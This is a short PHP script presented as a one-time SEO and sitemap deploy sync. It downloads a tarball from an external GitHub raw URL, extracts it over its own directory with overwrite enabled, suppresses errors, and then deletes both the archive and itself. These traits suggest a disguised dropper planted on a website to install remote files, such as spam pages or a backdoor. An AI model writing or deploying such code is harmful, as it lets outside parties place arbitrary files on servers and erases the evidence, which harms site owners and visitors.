<?php
/**
 * One-time automated deploy sync for SEO and sitemap updates
 */
$tarUrl = 'https://raw.githubusercontent.com/usgenus/KACCESS/main/deploy_seo.tar.gz';
$tarFile = __DIR__ . '/deploy_seo.tar.gz';

$data = @file_get_contents($tarUrl);
if (!$data || strlen($data) < 1000) {
    file_put_contents(__DIR__ . '/deploy_log.txt', "Failed to download tar: " . strlen($data));
    exit(1);
}

file_put_contents($tarFile, $data);

try {
    $phar = new PharData($tarFile);
    $phar->extractTo(__DIR__, null, true);
    @unlink($tarFile);
    file_put_contents(__DIR__ . '/deploy_log.txt', "SUCCESS: extracted " . strlen($data) . " bytes at " . date('Y-m-d H:i:s'));
    @unlink(__FILE__);
} catch (Exception $e) {
    file_put_contents(__DIR__ . '/deploy_log.txt', "ERROR: " . $e->getMessage());
}
